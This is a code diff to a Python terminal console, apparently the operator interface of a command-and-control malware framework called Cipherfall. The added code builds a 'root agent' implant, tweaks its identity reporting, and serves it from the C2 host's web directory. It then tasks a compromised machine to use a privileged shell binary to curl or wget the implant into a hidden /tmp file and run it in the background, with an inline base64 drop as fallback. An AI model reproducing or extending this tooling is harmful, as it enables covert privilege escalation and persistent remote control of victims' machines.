@@ -1198,6 +1198,7 @@ class CipherfallTUI(App):
         is_ntp     = worker_url.startswith("ntp://")
         psk        = _DEFAULT_PSK or "changeme"
         rtag       = uuid.uuid4().hex[:8]
+        served_path: "pathlib.Path | None" = None
         try:
             if is_ntp:
                 m          = re.match(r"ntp://([^:]+)", worker_url)
@@ -1209,23 +1210,61 @@ class CipherfallTUI(App):
                 out_path   = await asyncio.to_thread(
                     _bake_agent_cloudflare, _DEFAULT_URL, psk, 30, 10, f"_root_{rtag}.py"
                 )
-            agent_b64 = base64.b64encode(out_path.read_bytes()).decode()
-            out_path.unlink(missing_ok=True)
         except Exception as e:
             log.write(f"[red]root-agent: bake failed: {e}[/red]")
             return
         ra = f"/tmp/.r{rtag}.py"
-        spawn_cmd = (
-            f"printf '%s' '{agent_b64}' | base64 -d > {ra}; "
-            f"{bd} -p -c 'nohup python3 {ra} >/dev/null 2>&1 & echo ok'; "
-            f"echo '[rootagent:spawned]'"
+        # Patch baked agent: root gets a distinct agent_id (UID 0 vs testuser UID)
+        # and reports its real username rather than the inherited $USER env var.
+        agent_text = out_path.read_text(encoding="utf-8")
+        out_path.unlink(missing_ok=True)
+        agent_text = agent_text.replace(
+            "    return hashlib.sha256(seed.encode()).hexdigest()[:32]",
+            "    return hashlib.sha256((seed + '_' + str(os.geteuid())).encode()).hexdigest()[:32]",
         )
+        agent_text = agent_text.replace(
+            '        "user":       os.environ.get("USER") or os.environ.get("USERNAME", "?"),',
+            '        "user":       (lambda: __import__("pwd").getpwuid(os.geteuid()).pw_name'
+            ' if hasattr(os, "geteuid") else (os.environ.get("USER") or "?"))(),',
+        )
+        if is_ntp:
+            # NTP agent recvfrom(2048) silently truncates payloads > ~1.8 KB — AEAD tag
+            # mismatch causes the command to be dropped.  Serve the baked agent via the
+            # VPS HTTP server (python3 -m http.server 80, rooted at HERE/www/) and send
+            # a tiny curl/wget command instead of inline base64.
+            www_dir     = HERE / "www"
+            www_dir.mkdir(exist_ok=True)
+            served_name = f".r{rtag}.py"
+            served_path = www_dir / served_name
+            served_path.write_text(agent_text, encoding="utf-8")
+            host = _C2_HOST if _C2_HOST not in ("", "0.0.0.0") else "127.0.0.1"
+            spawn_cmd = (
+                f"{bd} -p -c '"
+                f"PATH=/usr/bin:/bin:/usr/sbin:/sbin:$PATH; "
+                f"curl -sfo {ra} http://{host}/{served_name} "
+                f"|| wget -qO {ra} http://{host}/{served_name}; "
+                f"nohup python3 {ra} >/dev/null 2>&1 & echo ok'; "
+                f"echo '[rootagent:spawned]'"
+            )
+        else:
+            agent_b64 = base64.b64encode(agent_text.encode()).decode()
+            spawn_cmd = (
+                f"printf '%s' '{agent_b64}' | base64 -d > {ra}; "
+                f"{bd} -p -c 'nohup python3 {ra} >/dev/null 2>&1 & echo ok'; "
+                f"echo '[rootagent:spawned]'"
+            )
         try:
             async with httpx.AsyncClient() as c:
                 await c.post(f"{base_url}/admin/task",
                              json={"agent_id": agent_id, "command": spawn_cmd}, timeout=5)
             log.write(f"[yellow]root agent deploy sent ({rtag}) — watch Agents tab[/yellow]")
+            if served_path is not None:
+                asyncio.get_event_loop().call_later(
+                    180, lambda p=served_path: p.unlink(missing_ok=True)
+                )
         except Exception as e:
+            if served_path is not None:
+                served_path.unlink(missing_ok=True)
             log.write(f"[red]root-agent: dispatch failed: {e}[/red]")
 
     async def _show_output(self, task_id: str) -> None:
